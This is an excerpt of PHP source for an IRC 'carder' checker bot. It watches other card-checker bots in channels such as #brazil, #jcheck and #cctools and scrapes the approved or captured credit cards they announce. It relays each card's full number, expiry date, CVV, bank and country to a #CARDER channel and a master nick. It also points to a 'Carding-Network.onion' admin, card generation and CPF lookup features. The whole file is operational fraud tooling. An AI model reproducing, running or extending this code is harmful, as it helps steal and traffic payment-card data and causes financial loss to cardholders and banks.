...
function VerificaCliente($nickirc, $identd, $hostirc){
	...
	$DBHOSTNAME     =	"host";
	$DBUSERNAME     =	"carder";
	$DBPASSWORD     =	"gerarsenha";
	$DBPERMITIDOS   =	"clientes";
...
// Send auth info
	fputs($socket,"USER ".$nickname." 0 * : [".$NAMESERVER."] @NORAH CHK-BOT\n");
...
while(1) {
	...
	while($data = fgets($socket, 512)) {
		...
		// VIADEX #brazil
		if($ex[0] == ":chkViadex24!bot@checkout.gaymer24.net" && $ex[1] == "PRIVMSG" && $ex[2] == "#brazil"){
			...
			if($posSTATUS === false) {
				...
				if($jsonNAME == "BRAZIL") {
					...
					fputs($socket, "PRIVMSG $master :[APROVADA] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #brazil \n");
				}
				fputs($socket, "PRIVMSG #CARDER :[APROVADA] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #brazil \n");
			}
		}
		// JMerchant #jcheck
		if($ex[0] == ":JMerchant!~JMerchant@JMerch.ChkNet.Bot" && $ex[1] == "PRIVMSG" && $ex[2] == "#jcheck") {
			...
			if($posSTATUS === false) {
				...
				fputs($socket, "PRIVMSG #CARDER :[APROVADA] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #jcheck \n");
			}
		}
		...
		if($ex[0] == ":DjRogerinhoBOT!~DjRogerin@xvideos.com" && $ex[1] == "PRIVMSG" && $ex[2] == "#alternative") {
			...
			if($posSTATUS === false) {
				...
				fputs($socket, "PRIVMSG #CARDER :[APROVADA] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO."\n");
		...
		if($ex[0] == ":B4nk!~SECURITY@1442D50B.21F1877E.C294562E.IP" && $ex[1] == "PRIVMSG" && $ex[2] == "#payment"){
			...
			if($posSTATUS === false) {
				...
				fputs($socket, "PRIVMSG #CARDER :[APROVADA] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [B4nk] [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #payment \n");
			}
		}
		// ChkNet #unix
		if($ex[0] == ":ChkNet!ChkNet@B7E9A087.ABEF7087.99DF22F4.IP" && $ex[1] == "PRIVMSG" && $ex[2] == "#unix"){
			...
			if($posSTATUS === false) {
				...
				$jsonNAME = convertCountry($dadosBIN[6]);
				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
				fputs($socket, "PRIVMSG #CARDER :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #unix \n");
				if($jsonNAME == "BRAZIL") {
					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
		...
		if($ex[0] == ":CheckBOT!~CheckBOT@Developer.FurkanTR" && $ex[1] == "PRIVMSG" && $ex[2] == "#cctools"){
			...
			if($posSTATUS === false) {
				...
				$jsonNAME = convertCountry($dadosBIN[6]);
				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
				fputs($socket, "PRIVMSG #CARDER :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #cctools \n");
				if($jsonNAME == "BRAZIL") {
					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
		...
		if($ex[0] == ":Freechk!~authorize@AC5A5AF6.EF3F9A09.7DC749EA.IP" && $ex[1] == "PRIVMSG" && $ex[2] == "#check"){
			...
			if($posSTATUS === false) {
				...
				fputs($socket, "PRIVMSG #CARDER :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #check \n");
			}
		}
		...
		if($ex[0] == ":OwnChk!~IamAwesom@msg.independent.for.premium" && $ex[1] == "PRIVMSG"){
			...
			if($posSTATUS === false) {
				...
				fputs($socket, "PRIVMSG #CARDER :[CAPTURE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] $ex[2] \n");
			}
		}
		// COMANDOS ADMIN
		// :Norah_C_IV@Carding-Network.onion PRIVMSG Carder_CHK :!ip
		if($ex[1] == "PRIVMSG" && $ex[2] == $nickname){
			...
			switch ($comando) {
				...
				fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] GERADAS BB [$statusGGBB] GERADAS ELO [$statusGGELO] CHECKER FULL [$statusFULL] CONSULTA NOME/CPF [$statusconsulta] \n");
			        break;
			    case version:
			        fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → Carder_CHK PHP Bot [VERSÃO] $version (BETA) updated [$release]\n");
			        break;
			    case dados:
			...
			if ($ex[0] == ":Norah_C_IV!~Norah_C_IV@Carding-Network.onion" || $ex[0] == ":Lecter!~nonamenoso@eat.the.rude" || $ex[0] == ":sigint!~chkbot@localhost") {
			    switch ($comando) {
			    case comandos:
				...
				fputs($socket, "PRIVMSG $nickCMD :!disableAutoVoice - Desativa AutoVoice In #CARDER\n");
				...
				fputs($socket, "PRIVMSG $nickCMD :!enableAutoVoice - Ativa AutoVoice In #CARDER\n");
				...
				$autovoice = false;
				fputs($socket, "PRIVMSG #CARDER :[4DESABILITADO] Auto Voice In #CARDER !\n");
			        break;
			    case enableAutoVoice:
				$autovoice = true;
				fputs($socket, "PRIVMSG #CARDER :[3HABILITADO] Auto Voice In #CARDER !\n");
			        break;
		...
		if($ex[1] == "JOIN" && isset($ex[2]) && $autovoice){
			...
			$chantmp = str_replace(":#", "", $ex[2]);
			$chanCMD = preg_replace('/\s+/', '', $chantmp);
			if (strtoupper($chanCMD) == "BRONX" && $nickCMD != "JBiLTDA" && $nickCMD != "Carder_CHK" && $nickCMD != "COMBINADOS") {
		...
		if(isset($ex[0]) && $ex[1] == "PRIVMSG" && strtoupper($ex[2]) == "#CARDER"){
			...
			switch ($comando) {
				...
				fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → [IP] $meuIP \n");
			        break;
			    case 'version':
			        fputs($socket, "PRIVMSG #CARDER :[11$nickCMD] → Carder_CHK PHP Bot [VERSÃO] $version (BETA) updated [$release]\n");
			        break;
			    case 'dados':
				$dados = json_decode(GeraPessoa());
